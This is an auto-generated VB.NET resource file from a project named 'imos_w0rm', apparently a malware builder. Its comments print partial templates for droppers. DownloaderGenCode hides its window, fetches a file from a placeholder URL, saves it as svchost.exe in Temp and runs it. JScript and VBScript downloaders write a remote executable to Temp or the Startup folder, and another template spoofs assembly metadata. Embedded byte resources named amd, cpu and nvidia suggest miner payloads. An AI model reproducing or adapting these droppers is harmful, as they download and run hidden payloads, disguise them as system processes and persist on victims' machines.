﻿'------------------------------------------------------------------------------
' <auto-generated>
'     This code was generated by a tool.
'     Runtime Version:4.0.30319.42000
'
'     Changes to this file may cause incorrect behavior and will be lost if
'     the code is regenerated.
' </auto-generated>
'------------------------------------------------------------------------------

Option Strict On
Option Explicit On

Imports System

Namespace My.Resources
    
    'This class was auto-generated by the StronglyTypedResourceBuilder
    'class via a tool like ResGen or Visual Studio.
    'To add or remove a member, edit your .ResX file then rerun ResGen
    'with the /str option, or rebuild your VS project.
    '''<summary>
    '''  A strongly-typed resource class, for looking up localized strings, etc.
    '''</summary>
    <Global.System.CodeDom.Compiler.GeneratedCodeAttribute("System.Resources.Tools.StronglyTypedResourceBuilder", "16.0.0.0"),  _
     Global.System.Diagnostics.DebuggerNonUserCodeAttribute(),  _
     Global.System.Runtime.CompilerServices.CompilerGeneratedAttribute(),  _
     Global.Microsoft.VisualBasic.HideModuleNameAttribute()>  _
    Friend Module Resources
        
        Private resourceMan As Global.System.Resources.ResourceManager
        
        Private resourceCulture As Global.System.Globalization.CultureInfo
        
        '''<summary>
        '''  Returns the cached ResourceManager instance used by this class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend ReadOnly Property ResourceManager() As Global.System.Resources.ResourceManager
            Get
                If Object.ReferenceEquals(resourceMan, Nothing) Then
                    Dim temp As Global.System.Resources.ResourceManager = New Global.System.Resources.ResourceManager("imos_w0rm.Resources", GetType(Resources).Assembly)
                    resourceMan = temp
                End If
                Return resourceMan
            End Get
        End Property
        
        '''<summary>
        '''  Overrides the current thread's CurrentUICulture property for all
        '''  resource lookups using this strongly typed resource class.
        '''</summary>
        <Global.System.ComponentModel.EditorBrowsableAttribute(Global.System.ComponentModel.EditorBrowsableState.Advanced)>  _
        Friend Property Culture() As Global.System.Globalization.CultureInfo
            Get
                Return resourceCulture
            End Get
            Set
                resourceCulture = value
            End Set
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property amd() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("amd", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property cpu() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("cpu", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Public Class Form1
        '''
        '''    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        '''        Me.Hide()
        '''        Me.ShowInTaskbar = False
        '''        Me.ShowIcon = False
        '''        Me.Opacity = 0
        '''        Dim URL As String = Hex2String(&quot;%url%&quot;)
        '''        Dim Doumloadto As String = Environ(&quot;temp&quot;) &amp; &quot;\svchost.exe&quot;
        '''        Try
        '''            Dim w As New Net.WebClient
        '''            IO.File.WriteAllBytes(Doumloadto, w.DownloadData(URL))
        '''            Process.Start(Doumloadto)
        '''        Catch ex As Exce [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property DownloaderGenCode() As String
            Get
                Return ResourceManager.GetString("DownloaderGenCode", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to try {
        '''	var WshShell = WScript.CreateObject(&quot;WScript.Shell&quot;);
        '''    var filepath = WshShell.ExpandEnvironmentStrings(&quot;%TEMP%&quot;) + &quot;/%name%.exe&quot;;
        '''	var url = &quot;%url%&quot;
        '''	var xhr = new ActiveXObject(&quot;MSXML2.XMLHTTP&quot;)
        '''	xhr.open(&quot;GET&quot;, url, false)
        '''    xhr.send()
        '''	
        '''	var fso = new ActiveXObject(&quot;Scripting.FileSystemObject&quot;)
        '''	if (fso.FileExists(filepath) == false) {
        '''		var stream = new ActiveXObject(&quot;ADODB.Stream&quot;)
        '''		stream.Open()
        '''        stream.Type = 1
        '''        stream.Write(xhr.ResponseBody)
        '''        stream.P [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property JSDownloader() As String
            Get
                Return ResourceManager.GetString("JSDownloader", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property nvidia() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("nvidia", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Imports System.Security.Cryptography
        '''Imports Microsoft.Win32
        '''Imports System.Management
        '''Imports System
        '''Imports System.Net.Sockets
        '''Imports Microsoft.VisualBasic
        '''Imports System.Diagnostics
        '''Imports System.Reflection
        '''Imports System.Runtime.InteropServices
        '''Imports System.Collections.Generic
        '''Imports System.Drawing
        '''Imports System.Windows.Forms
        '''Imports System.IO
        '''Imports System.Net
        '''Imports System.Drawing.Drawing2D
        '''Imports System.Drawing.Imaging
        '''Imports System.Threading
        '''Imports System.Security
        '''Import [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property Program() As String
            Get
                Return ResourceManager.GetString("Program", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized resource of type System.Byte[].
        '''</summary>
        Friend ReadOnly Property Project1() As Byte()
            Get
                Dim obj As Object = ResourceManager.GetObject("Project1", resourceCulture)
                Return CType(obj,Byte())
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Imports System.Reflection
        '''Imports System.Windows.Forms
        '''Imports System.Diagnostics.Process
        '''Imports System.Environment
        '''Imports System.Convert
        '''Imports System
        '''Imports System.Diagnostics
        '''Imports system.threading
        '''Imports Microsoft.VisualBasic
        '''
        '''&lt;Assembly: AssemblyTitle(&quot;%ProductName%&quot;)&gt;
        '''&lt;Assembly: AssemblyDescription(&quot;%FileDescription%&quot;)&gt;
        '''&lt;Assembly: AssemblyCompany(&quot;%CompanyName%&quot;)&gt;
        '''&lt;Assembly: AssemblyProduct(&quot;%ProductName%&quot;)&gt;
        '''&lt;Assembly: AssemblyCopyright(&quot;%LegalCopyright%&quot;)&gt;
        '''&lt;Assembly: AssemblyTrad [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property String1() As String
            Get
                Return ResourceManager.GetString("String1", resourceCulture)
            End Get
        End Property
        
        '''<summary>
        '''  Looks up a localized string similar to Set YcytN = CreateObject(&quot;WScript.Shell&quot;)
        '''KFBb = wshShell.SpecialFolders(&quot;Startup&quot;) &amp; &quot;\name%..exe]&quot;
        '''Call lXBfStR
        '''sub lXBfStR
        '''    dim GFNItD: Set GFNItD = createobject(&quot;Microsoft.XMLHTTP&quot;)
        '''    dim GSXDVB: Set GSXDVB = createobject(&quot;Adodb.Stream&quot;)
        '''    GFNItD.Open &quot;GET&quot;, &quot;%url%&quot;, False
        '''    GFNItD.Send
        '''    with GSXDVB
        '''      .type = 1
        '''      .open
        '''      .write GFNItD.responseBody
        '''      .savetofile KFBb, 2
        '''    end with
        '''end sub
        '''
        '''
        '''BFBDF = wshShell.ExpandEnvironmentStrings(&quot;%Temp%&quot;) + &quot;\%name%.exe&quot;        ''' [rest of string was truncated]&quot;;.
        '''</summary>
        Friend ReadOnly Property VBSDownlader() As String
            Get
                Return ResourceManager.GetString("VBSDownlader", resourceCulture)
            End Get
        End Property
    End Module
End Namespace
